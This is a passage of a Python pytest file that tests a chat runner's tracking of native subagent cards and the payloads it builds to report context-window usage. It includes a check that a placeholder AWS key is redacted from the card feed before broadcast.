        entry["status"] = {"type": "working", "message": "reading files"}
        chat_runner._native_subagent_sync(state, slot, [entry], tracker)

        assert tracker["s3"]["last_tool"] == "reading files"
        assert any(call.args[0] == "subagent_tool" for call in state.broadcast_ws.call_args_list)

    def test_unreported_stale_card_is_auto_closed(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker: dict = {
            "gone": {
                "id": "native:gone",
                "started": 0.0,
                "done": False,
                "agent": "worker",
                "task": "stalled work",
                "last_activity": 0.0,
            }
        }

        chat_runner._native_subagent_sync(state, slot, [], tracker)

        assert tracker["gone"]["done"] is True
        assert tracker["gone"]["error"] == "timed out (no activity)"

    def test_close_all_completes_open_cards_without_an_error(self, tmp_path):
        state, slot = _state(tmp_path), _slot()
        tracker = {"open": {"started": 0.0, "done": False, "task": "t", "agent": "a"}}

        chat_runner._native_subagent_close_all(state, slot, tracker)

        assert tracker["open"]["done"] is True
        assert tracker["open"]["error"] is None

    def test_card_registry_round_trip(self, tmp_path):
        state = _state(tmp_path)

        chat_runner._register_native_card(state, "native:x", "chat-1", "sid-1")
        assert state._native_cards["native:x"]["session_id"] == "sid-1"

        chat_runner._unregister_native_card(state, "native:x")
        assert "native:x" not in state._native_cards

    def test_unregister_without_a_registry_is_a_noop(self, tmp_path):
        state = _state(tmp_path)
        if hasattr(state, "_native_cards"):
            del state._native_cards

        chat_runner._unregister_native_card(state, "native:x")

        assert not hasattr(state, "_native_cards")

    def test_terminal_records_are_bounded_by_keep_and_ttl(self):
        now = 1000.0
        tracker = {
            "fresh": {"id": "native:fresh", "done": True, "done_at": now - 1},
            "older": {"id": "native:older", "done": True, "done_at": now - 2},
            "expired": {"id": "native:expired", "done": True, "done_at": now - 10_000},
            "running": {"id": "native:running", "done": False, "done_at": now},
            "unidentified": {"done": True, "done_at": now},
        }

        kept = chat_runner._retain_terminal_native(tracker, keep=1, ttl_secs=100.0, now=now)

        assert list(kept) == ["fresh"]

    def test_native_output_collapses_to_the_newest_tail(self):
        buf: list[str] = []
        total = chat_runner._append_native_output(buf, "a" * 50, 0, cap=10, hard=20)

        assert total == 10
        assert buf == ["a" * 10]

    def test_done_result_marks_a_truncated_feed(self):
        out = chat_runner._native_done_result(
            ["z" * (chat_runner.NATIVE_SUBAGENT_DONE_RESULT_CAP + 5)]
        )

        assert out.startswith(chat_runner.NATIVE_SUBAGENT_DONE_TRUNC_MARKER)

    def test_card_feed_redacts_before_the_broadcast(self):
        feed = chat_runner._native_card_feed({"native:x": ["AKIAIOSFODNN7EXAMPLE"]}, "native:x")

        assert "AKIAIOSFODNN7EXAMPLE" not in feed

    def test_empty_card_feed_is_empty(self):
        assert chat_runner._native_card_feed(None, "native:x") == ""


class TestContextUsagePayload:
    def test_missing_counts_emit_a_reset_frame(self):
        """A bare {slot, pct} frame would strand stale token counts on the ring."""
        client = MagicMock()
        client.context_usage_pct = MagicMock(return_value=44.44)
        client.context_window_tokens = MagicMock(return_value=0)

        payload = chat_runner._context_usage_payload("chat-1", client)

        assert payload == {"slot": "chat-1", "pct": 44.4, "reset": True}

    def test_real_counts_ship_the_pair(self):
        client = MagicMock()
        client.context_usage_pct = MagicMock(return_value=10.0)
        client.context_window_tokens = MagicMock(return_value=200_000)
        client.context_used_tokens = MagicMock(return_value=20_000)

        payload = chat_runner._context_usage_payload("chat-1", client)

        assert payload["used_tokens"] == 20_000
        assert payload["window_tokens"] == 200_000
        assert "reset" not in payload

    def test_zero_used_still_emits_a_reset_frame(self):
        client = MagicMock()
        client.context_usage_pct = MagicMock(return_value=0.0)
        client.context_window_tokens = MagicMock(return_value=200_000)
        client.context_used_tokens = MagicMock(return_value=0)

        assert chat_runner._context_usage_payload("chat-1", client)["reset"] is True
